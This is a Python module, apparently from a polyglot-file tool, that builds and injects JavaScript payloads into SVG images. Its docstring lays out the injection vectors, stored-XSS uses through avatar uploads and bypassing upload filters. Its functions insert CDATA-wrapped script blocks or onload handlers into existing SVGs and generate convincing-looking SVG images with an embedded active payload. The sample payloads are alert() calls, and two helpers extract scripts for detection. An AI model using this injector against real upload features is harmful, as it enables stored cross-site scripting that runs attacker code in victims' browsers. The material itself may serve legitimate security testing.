"""
SVG Format Helper — Job A (Normalization) & Job B (Injection)
=============================================================
SVG (Scalable Vector Graphics) is a W3C XML-based vector image format.

CRITICAL distinction from raster images (PNG, JPEG, GIF):
  PNG/JPEG/GIF = Binary raster pixel matrices. No DOM, no scripting.
  SVG           = XML Document Object Model. Full scripting via <script>
                  and event-handler attributes is part of the official spec.

Parsing contract:
  SVG is served as 'image/svg+xml'. Unlike binary images where browsers
  invoke a pixel decoder, SVG is handed to the XML/DOM parser engine.
  When loaded in a browsing context (<object>, <embed>, <iframe>, or
  direct URL navigation), the browser builds a full DOM tree and executes
  any embedded <script> elements in the document's origin.

  append_tolerant  : True  — bytes after </svg> are ignored by XML parsers
  prepend_tolerant : True  — XML declaration and comments before <svg> are
                             valid per XML spec; arbitrary leading bytes are
                             tolerated by browsers in quirks mode
  max_prepend_bytes: -1    — unlimited (XML parsers parse forward)
  scans_from_end   : False — XML parsers read forward

Injection points:
  1. Direct <script> element inside <svg> (primary vector):
       <svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>
  2. Event-handler attributes on any SVG element (SVGElement.onload, onclick):
       <svg onload="alert(document.domain)" xmlns="...">...</svg>
  3. <foreignObject> element (embeds XHTML/HTML DOM inside SVG):
       <svg><foreignObject><body><script>alert(1)</script></body></foreignObject></svg>

Security boundary:
  Browsers ONLY suppress SVG script execution when SVG is loaded via an
  <img src="..."> tag (image loading context, scripts disabled by design).
  When served via <object>, <embed>, <iframe>, or direct navigation,
  scripts execute in the full origin of the serving domain.

CDATA requirement:
  Because SVG is parsed as XML (not HTML), script content containing
  '<', '>', or '&' must be wrapped in a CDATA section to prevent the
  XML parser from treating them as markup:
    <script type="text/javascript"><![CDATA[ ... ]]></script>

Real-world impact:
  - SVG avatar/logo upload → Stored XSS in the serving origin
  - CDN-hosted SVG without nosniff/CSP → Client-side script execution
  - SVG polyglot: valid SVG visual asset + embedded payload script
  - Bypasses upload filters that check for binary image magic bytes
    (SVG has no binary magic bytes; it starts with XML text)
"""

from __future__ import annotations
import re

# ── Constants ─────────────────────────────────────────────────────────────────

# XML/SVG identifiers near file start
_HEADER_CANDIDATES = (
    b"<svg",
    b"<?xml",
    b"<!DOCTYPE svg",
)

_TRAILING_WHITESPACE = b" \t\r\n"

# Namespace required for standalone SVG documents
SVG_NAMESPACE = 'xmlns="http://www.w3.org/2000/svg"'

# Standard CDATA-wrapped script block for XML-safe injection
_CDATA_SCRIPT_TEMPLATE = (
    '<script type="text/javascript">'
    '<![CDATA[\n{payload}\n]]>'
    '</script>'
)

# Simple onload attribute injection (no CDATA needed for attribute values)
_ONLOAD_TEMPLATE = 'onload="{payload}"'


# ── Job A helpers ─────────────────────────────────────────────────────────────

def normalize(svg_bytes: bytes) -> bytes:
    """
    Return SVG bytes ready for use as host in an APPEND or INJECT polyglot.

    SVG/XML parsers stop at </svg> and discard trailing bytes. We strip
    trailing whitespace only for cleanliness; no structural changes needed.
    """
    return svg_bytes.rstrip(_TRAILING_WHITESPACE)


def has_valid_header(svg_bytes: bytes) -> bool:
    """
    Return True if the bytes look like SVG/XML content.

    SVG has no binary magic bytes. Identification is text-based:
    the file must begin with an XML declaration, DOCTYPE, or <svg> element
    within the first 512 bytes.
    """
    window = svg_bytes[:512].lstrip(_TRAILING_WHITESPACE).lower()
    return any(window.startswith(cand.lower()) for cand in _HEADER_CANDIDATES)


def is_valid_xml_svg(svg_bytes: bytes) -> bool:
    """
    Return True if the SVG appears to be a valid standalone XML SVG document
    (single root <svg> element with the W3C namespace).
    """
    text = svg_bytes.decode("utf-8", errors="replace")
    has_ns = "xmlns" in text and "w3.org/2000/svg" in text
    has_root = bool(re.search(r"<svg\b", text, re.IGNORECASE))
    return has_ns and has_root


# ── Job B helpers (Injection) ─────────────────────────────────────────────────

def find_injection_offset(svg_bytes: bytes) -> int:
    """
    Find the optimal offset to inject a <script> element inside <svg>.

    Strategy (in priority order):
    1. After the opening <svg ...> tag's closing '>' — earliest valid position.
    2. Before the closing </svg> tag — safe fallback.
    3. End of file — last resort.
    """
    text = svg_bytes.decode("utf-8", errors="replace")

    # Find the end of the opening <svg ...> tag
    m = re.search(r"<svg\b[^>]*>", text, re.IGNORECASE | re.DOTALL)
    if m:
        # Insert right after the opening <svg> tag
        char_offset = m.end()
        return len(text[:char_offset].encode("utf-8"))

    # Fallback: before </svg>
    m_close = re.search(r"</svg\s*>", text, re.IGNORECASE)
    if m_close:
        char_offset = m_close.start()
        return len(text[:char_offset].encode("utf-8"))

    # Last resort: end of file
    return len(svg_bytes)


def inject_payload(svg_bytes: bytes, payload: bytes) -> tuple[bytes, int]:
    """
    Inject a script payload into an SVG document using CDATA-wrapped <script>.

    The payload is wrapped in a CDATA section to satisfy the XML parser
    requirement that '<', '>', and '&' characters inside a <script> element
    do not break the XML structure.

    Parameters
    ----------
    svg_bytes : Raw host SVG bytes.
    payload   : Script bytes to embed (the JS body — without <script> tags).

    Returns
    -------
    (new_svg_bytes, payload_offset) where payload_offset points to the
    start of the injected block.
    """
    insert_pos = find_injection_offset(svg_bytes)

    try:
        payload_str = payload.decode("utf-8", errors="replace")
    except Exception:
        payload_str = payload.decode("latin-1", errors="replace")

    script_block = f'\n{_CDATA_SCRIPT_TEMPLATE.format(payload=payload_str)}\n'
    script_bytes = script_block.encode("utf-8")

    polyglot = svg_bytes[:insert_pos] + script_bytes + svg_bytes[insert_pos:]
    payload_offset = insert_pos + script_bytes.index(b"<![CDATA[") + len(b"<![CDATA[\n")
    return polyglot, payload_offset


def inject_onload(svg_bytes: bytes, payload: bytes) -> tuple[bytes, int]:
    """
    Inject payload via onload= attribute on the root <svg> element.

    This is the shortest-path injection for event-handler attribute vectors.
    Useful when <script> tags are filtered but attribute-based handlers are not.

    Parameters
    ----------
    svg_bytes : Raw host SVG bytes.
    payload   : JS expression bytes (e.g. b"alert(document.domain)").

    Returns
    -------
    (new_svg_bytes, payload_offset)
    """
    text = svg_bytes.decode("utf-8", errors="replace")

    # Find the opening <svg tag and insert onload before the closing >
    m = re.search(r"(<svg\b[^>]*?)(\s*/?>)", text, re.IGNORECASE | re.DOTALL)
    if not m:
        # No <svg> tag found — fall back to full script injection
        return inject_payload(svg_bytes, payload)

    try:
        payload_str = payload.decode("utf-8", errors="replace")
    except Exception:
        payload_str = payload.decode("latin-1", errors="replace")

    # Escape double-quotes in the payload so the attribute stays valid
    payload_escaped = payload_str.replace('"', "&quot;")
    onload_attr = f' onload="{payload_escaped}"'

    new_text = text[: m.start(2)] + onload_attr + text[m.start(2):]
    new_bytes = new_text.encode("utf-8")
    payload_offset = new_bytes.find(onload_attr.encode("utf-8")) + len(' onload="')
    return new_bytes, payload_offset


def build_standalone_svg(
    width: int = 400,
    height: int = 400,
    title: str = "PolyMorph SVG Vector Asset",
    subtitle: str = "Vector Image — Embedded Active Payload",
    payload: str = 'alert("PolyMorph Vector Polyglot: " + document.domain)',
    bg_color: str = "#0f172a",
    text_color: str = "#38bdf8",
) -> bytes:
    """
    Build a complete, self-contained standalone SVG polyglot document.

    The SVG renders a visually convincing diagram-style graphic while
    embedding a CDATA-wrapped <script> that executes in the serving origin
    when the file is loaded in an <object>, <embed>, <iframe>, or direct
    browser navigation context.

    Parameters
    ----------
    width, height : SVG viewport dimensions.
    title         : Primary visual text label.
    subtitle      : Secondary visual text label.
    payload       : JavaScript expression executed when SVG DOM is active.
    bg_color      : Rectangle fill color (hex).
    text_color    : Title text color (hex).

    Returns
    -------
    UTF-8-encoded SVG document bytes.
    """
    svg = f"""<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg"
     viewBox="0 0 {width} {height}"
     width="{width}"
     height="{height}">
  <rect width="100%" height="100%" fill="{bg_color}" rx="12"/>
  <circle cx="{width // 2}" cy="{height // 3}" r="{min(width, height) // 6}"
          fill="{text_color}" opacity="0.85"/>
  <text x="50%" y="{int(height * 0.62)}%"
        fill="{text_color}"
        font-family="monospace"
        font-size="{max(14, width // 22)}"
        font-weight="bold"
        text-anchor="middle">{title}</text>
  <text x="50%" y="{int(height * 0.72)}%"
        fill="#94a3b8"
        font-family="monospace"
        font-size="{max(11, width // 30)}"
        text-anchor="middle">{subtitle}</text>
  <script type="text/javascript">
    <![CDATA[
      {payload}
    ]]>
  </script>
</svg>"""
    return svg.encode("utf-8")


def extract_scripts(svg_bytes: bytes) -> list[str]:
    """
    Extract all <script> element bodies from an SVG document.

    Returns a list of script content strings (CDATA-unwrapped).
    Used by detection and analysis routines.
    """
    text = svg_bytes.decode("utf-8", errors="replace")
    scripts: list[str] = []

    for m in re.finditer(
        r"<script\b[^>]*>(.*?)</script>",
        text,
        re.IGNORECASE | re.DOTALL,
    ):
        content = m.group(1)
        # Unwrap CDATA section if present
        cdata_m = re.search(r"<!\[CDATA\[(.*?)]]>", content, re.DOTALL)
        if cdata_m:
            scripts.append(cdata_m.group(1).strip())
        else:
            scripts.append(content.strip())

    return scripts


def extract_event_handlers(svg_bytes: bytes) -> list[tuple[str, str]]:
    """
    Extract all inline event-handler attributes from SVG elements.

    Returns list of (element_name, handler_expression) tuples.
    Used by detection routines to identify attribute-based injection.
    """
    text = svg_bytes.decode("utf-8", errors="replace")
    handlers: list[tuple[str, str]] = []

    event_attrs = [
        "onload", "onclick", "onmouseover", "onerror",
        "onmouseenter", "onfocus", "onactivate",
    ]
    pattern = r"<(\w+)\b[^>]*\b(" + "|".join(event_attrs) + r')\s*=\s*["\']([^"\']*)["\']'
    for m in re.finditer(pattern, text, re.IGNORECASE):
        handlers.append((m.group(1), m.group(3)))

    return handlers
